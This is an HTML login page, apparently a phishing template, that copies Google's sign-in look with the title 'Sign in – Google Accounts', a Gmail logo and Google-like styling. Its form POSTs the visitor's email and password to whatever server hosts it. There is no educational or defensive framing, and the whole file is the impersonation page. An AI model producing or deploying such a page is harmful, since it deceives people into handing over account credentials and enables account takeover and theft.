<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google Accounts</title>
  <link rel="icon" href="/assets/gmail.png">
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 40px;
      width: 350px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
      border-radius: 8px;
      text-align: center;
    }
    .logo {
      width: 60px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="/assets/gmail.png" class="logo" alt="Gmail">
    <h2>Sign in</h2>
    <form method="POST">
      <input type="text" name="email" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
